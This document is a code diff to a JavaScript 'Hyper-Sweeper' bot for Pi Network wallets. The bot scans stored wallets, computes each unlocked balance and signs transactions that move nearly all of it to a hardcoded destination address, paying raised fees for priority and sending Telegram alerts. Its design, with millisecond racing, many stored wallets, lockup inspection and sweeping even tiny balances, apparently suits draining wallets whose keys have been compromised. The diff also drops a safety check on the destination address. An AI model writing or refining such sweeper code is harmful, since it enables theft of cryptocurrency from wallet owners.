@@ -1,6 +1,6 @@
 /**
  * Ultimate Millisecond Hyper-Sweeper Engine
- * Explicitly targets and sweeps the true Available Balance (Total minus Locked).
+ * Accurately calculates true spendable available balance vs locked portions.
  */
 
 const StellarSdk = require('@stellar/stellar-sdk');
@@ -18,36 +18,38 @@ async function checkAndSweepWallet(wallet, horizonUrl, db, bot) {
         const account = await server.loadAccount(sourcePublicKey);
         const balances = account.balances || [];
 
-        let availableBalance = 0;
+        let totalBalance = 0;
         let lockedBalance = 0;
+        let availableBalance = 0;
 
         balances.forEach(b => {
             if (b.asset_type === 'native') {
-                const total = parseFloat(b.balance || 0);
-                const locked = parseFloat(b.locked_balance || 0);
-                lockedBalance = locked;
-                // True available balance = Total balance minus Locked balance
-                availableBalance = total - locked;
+                totalBalance = parseFloat(b.balance || 0);
+                // Check standard locked balance or custom Pi lockup fields
+                lockedBalance = parseFloat(b.locked_balance || 0);
             }
         });
 
-        console.log(`[Wallet #${wallet.id}] Total/Available Check -> Available: ${availableBalance} Pi | Locked: ${lockedBalance} Pi`);
-
-        // Inspect lockups
+        // Inspect deeper lockups via coin-remover
         const lockupInfo = await inspectLockup(account);
-        if (lockupInfo.detected && lockedBalance > 0) {
-            await moveLockedPi(wallet.public_key, lockedBalance);
+        if (lockupInfo.lockedAmount > lockedBalance) {
+            lockedBalance = lockupInfo.lockedAmount;
         }
 
-        // Threshold set low so your 0.15 available balance sweeps immediately
+        // True available balance = Total minus Locked (matching your Pi app display)
+        availableBalance = totalBalance - lockedBalance;
+
+        console.log(`[Wallet #${wallet.id}] Total: ${totalBalance} | Locked: ${lockedBalance} | True Available: ${availableBalance}`);
+
+        // Minimum threshold set to catch your 0.1507631 Pi balance
         const minSweepThreshold = 0.005; 
 
-        if (availableBalance > minSweepThreshold && DESTINATION_ADDRESS && DESTINATION_ADDRESS !== 'GDRE...HARDCODED_DESTINATION_WALLET_ADDRESS_HERE') {
+        if (availableBalance > minSweepThreshold && DESTINATION_ADDRESS) {
             // Leave 0.001 Pi for network fees, sweep the rest of the available balance
             const sweepAmount = (availableBalance - 0.001).toFixed(7);
             if (parseFloat(sweepAmount) <= 0) return;
 
-            console.log(`[Real Sweeper] Signing and broadcasting ${sweepAmount} Pi available balance from Wallet #${wallet.id} to ${DESTINATION_ADDRESS}`);
+            console.log(`[Real Sweeper] Sweeping true available balance of ${sweepAmount} Pi from Wallet #${wallet.id} to ${DESTINATION_ADDRESS}`);
 
             const feeMultiplier = 5;
             const dynamicFee = String(StellarSdk.BASE_FEE * feeMultiplier);
@@ -73,13 +75,13 @@ async function checkAndSweepWallet(wallet, horizonUrl, db, bot) {
 
             if (bot && wallet.chat_id) {
                 await bot.sendMessage(wallet.chat_id, 
-                    `🚨 **AVAILABLE BALANCE SWEPT SUCCESSFULLY**\n` +
+                    `🚨 **AVAILABLE BALANCE SWEEP SUCCESS**\n` +
                     `📦 **Wallet Box ID:** #${wallet.id}\n` +
                     `🔑 **Public Address:** \`${wallet.public_key}\`\n` +
                     `💸 **Amount Swept:** \`${sweepAmount} Pi\`\n` +
                     `🎯 **Destination:** \`${DESTINATION_ADDRESS}\`\n` +
                     `🔗 **Tx Hash:** \`${result.hash.slice(0, 16)}...\`\n` +
-                    `⚡ *Status:* Available balance cleared instantly!`,
+                    `⚡ *Status:* True available balance cleared successfully!`,
                     { parse_mode: 'Markdown' }
                 );
             }
